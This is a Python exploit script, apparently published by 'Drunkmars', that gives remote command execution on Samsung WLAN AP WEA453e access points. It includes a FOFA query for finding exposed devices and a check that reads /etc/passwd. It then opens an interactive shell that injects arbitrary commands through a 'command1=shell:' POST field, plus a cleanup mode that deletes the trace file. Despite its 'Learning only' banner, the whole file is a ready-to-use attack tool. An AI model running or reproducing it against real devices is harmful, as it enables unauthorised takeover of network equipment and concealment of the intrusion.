#!/usr/bin/python3
#fofa search: title="Samsung WLAN AP"
#Author Drunkmars

import sys
import requests
import time
import os
from urllib3.exceptions import InsecureRequestWarning


def Check():
	try:
		CheckData = "command1=shell:cat /etc/passwd| dd of=/tmp/hello.txt"
		response = requests.post(url = Payload,data = CheckData,verify = False,timeout = 10)

		if(response.status_code == 200 and 'root:' in response.text):
			return True
		else:
			return False

	except Exception as e:
		#print("checking")
		print("[-] Server Error!")

def Exploit():
	while True:
		try:
			command = input("# ")
			if(command == 'exit'):
				sys.exit()
			if(command == 'cls'):
				os.system("cls")
				continue

			Expdata = "command1=shell:" + command + "| dd of=/tmp/hello.txt"

			response = requests.post(url = Payload,data = Expdata,verify = False,timeout = 10)
				
			print(response.text)

		except Exception as e:
			print("[-] Server not support this command!")

def Clean():
	try:
		CleanData = "command1=shell:busybox rm -f /tmp/hello.txt"
		response = requests.post(url = Payload,data = CleanData,verify = False,timeout = 10)

		if(response.status_code == 200):
			print("[+] Clean target successfully!")
			sys.exit()
		else:
			print("[-] Clean target failed!")

	except Exception as e:
		print("[-] Server error!")

if __name__ == '__main__':
	if(len(sys.argv) < 2):
		print("|-----------------------------------------------------------------------------------|")
		print("|                                WLAN-AP-WEA453e Rce                                |")
		print("|                       UseAge: python3 exploit.py target                           |")
		print("|                   Example: python3 exploit.py https://192.168.1.1/                |")
		print("|                 Clean target: python3 exploit.py https://192.168.1.1/ clean       |")
		print("|                                [!] Learning only                                  |")
		print("|___________________________________________________________________________________|")
		sys.exit()

	target = sys.argv[1]
	Payload = target + "(download)/tmp/hello.txt"	
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

	if(len(sys.argv) == 3):
		module = sys.argv[2]
		if(module == 'clean'):
			Clean()
		else:
			print("[-] module error")

	while Check() is True:
		Exploit()
